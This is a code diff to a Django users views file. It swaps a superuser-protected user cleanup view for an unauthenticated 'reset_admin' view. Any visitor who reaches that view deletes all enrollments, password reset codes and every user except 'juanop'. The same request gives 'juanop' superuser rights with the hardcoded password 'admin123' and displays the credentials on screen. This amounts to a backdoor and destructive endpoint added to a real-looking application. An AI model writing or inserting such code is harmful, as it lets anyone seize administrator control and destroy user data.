@@ -129,13 +129,20 @@ def password_reset_confirm(request):
 
     return render(request, 'users/password_reset_confirm.html')
 
-@login_required
-@user_passes_test(lambda u: u.is_superuser)
-def cleanup_users(request):
-    count = User.objects.exclude(username='juanop').count()
+def reset_admin(request):
+    from apps.courses.models import Enrollment
+    Enrollment.objects.all().delete()
+    PasswordResetCode.objects.all().delete()
+    user = User.objects.filter(username='juanop').first()
+    if not user:
+        user = User.objects.create(username='juanop', email='admin@admin.com', is_superuser=True, is_staff=True, is_active=True)
+    user.set_password('admin123')
+    user.is_superuser = True
+    user.is_staff = True
+    user.save()
     User.objects.exclude(username='juanop').delete()
-    messages.success(request, f'Usuarios eliminados: {count}')
-    return redirect('users:admin_panel')
+    messages.success(request, 'Admin reseteado: usuario=juanop, password=admin123')
+    return redirect('users:login')
 
 def logout_view(request):
     logout(request)
